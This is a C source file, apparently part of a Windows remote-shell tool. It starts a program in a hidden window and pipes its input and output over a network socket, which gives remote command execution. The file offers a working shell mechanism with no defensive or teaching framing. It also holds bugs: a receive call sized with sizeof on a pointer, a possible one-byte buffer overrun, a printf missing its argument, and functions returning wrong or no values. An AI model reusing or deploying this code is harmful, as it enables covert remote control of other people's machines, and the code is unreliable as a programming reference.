#include "RemoteShell.h"

int DataSend(SOCKET s, char *Buffer);
int DataRecv(SOCKET s, char *Buffer);

int ConnectShell(char *path, SOCKET s, HANDLE hEvent)
{
    IPC_PIPE IpcPipe;

    if (hEvent == NULL)
    {
        printf("[*] Socket event not found!\n");
        printf("[+] Create socket event...\n");
        hEvent = WSACreateEvent();
        printf("[+] Set network event : FD_READ, FD_CLOSE\n");
        WSAEventSelect(s, hEvent, FD_READ | FD_CLOSE);
    }
    else
    {
        printf("[*] Socket event found!\n");
    }

    printf("[*] Process starting...\n");
    HANDLE hProcess = ProcessStart(path, &IpcPipe);

    DWORD dwOut = 0, dwRead = 0;
    char Buffer[1024];

    while (TRUE)
    {
        ZeroMemory(Buffer, sizeof(Buffer));
        if (PeekNamedPipe(IpcPipe.hParentRead, NULL, 0, NULL, &dwOut, NULL) && dwOut > 0)
        {
            ReadFile(IpcPipe.hParentRead, Buffer, sizeof(Buffer), &dwRead, NULL);
            printf("[+] Send by %d Byte\n", dwRead);
            Buffer[dwRead] = NULL;
            // printf("%s", Buffer);
            DataSend(s, Buffer);
        }

        WSANETWORKEVENTS NetworkEvents = {
            0,
        };
        if (WSAEnumNetworkEvents(s, hEvent, &NetworkEvents) == SOCKET_ERROR)
        {
            printf("[-] WSAEnumNetworkEvents failed!\n");
            printf("[+] GetLastError : %d\n", GetLastError());
            continue;
        }

        if (NetworkEvents.lNetworkEvents & FD_READ)
        {
            printf("[+] Receive by %d Byte\n", DataRecv(s, Buffer));
            WriteFile(IpcPipe.hParentWrite, Buffer, strlen(Buffer), NULL, NULL);
        }
        else if (NetworkEvents.lNetworkEvents & FD_CLOSE)
        {
            printf("[*] Socket closed\n");
            break;
        }

        if (WaitForSingleObject(hProcess, 0) == 0)
        {
            printf("[*] Process terminated!\n");
            DataSend(s, "[*] Process terminated!");
            break;
        }
    }

    TerminateProcess(hProcess, 0);
    closesocket(s);
    CloseHandle(hEvent);
}

HANDLE ProcessStart(char *path, IPC_PIPE *IpcPipe)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    printf("[*] Create stdin, stdout pipe\n");

    CreatePipe(&IpcPipe->hChildRead, &IpcPipe->hParentWrite, &sa, 0);
    CreatePipe(&IpcPipe->hParentRead, &IpcPipe->hChildWrite, &sa, 0);

    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = IpcPipe->hChildRead;
    si.hStdOutput = IpcPipe->hChildWrite;
    si.hStdError = IpcPipe->hChildWrite;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, path, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == 0)
    {
        printf("[-] Process start failed!\n");
        printf("[+] GetLastError : %d\n");
        return 1;
    }

    printf("[*] Process started!\n");

    CloseHandle(pi.hThread);

    return pi.hProcess;
}

int DataSend(SOCKET s, char *Buffer)
{
    return send(s, Buffer, strlen(Buffer), 0);
}

int DataRecv(SOCKET s, char *Buffer)
{
    return recv(s, Buffer, sizeof(Buffer), 0);
}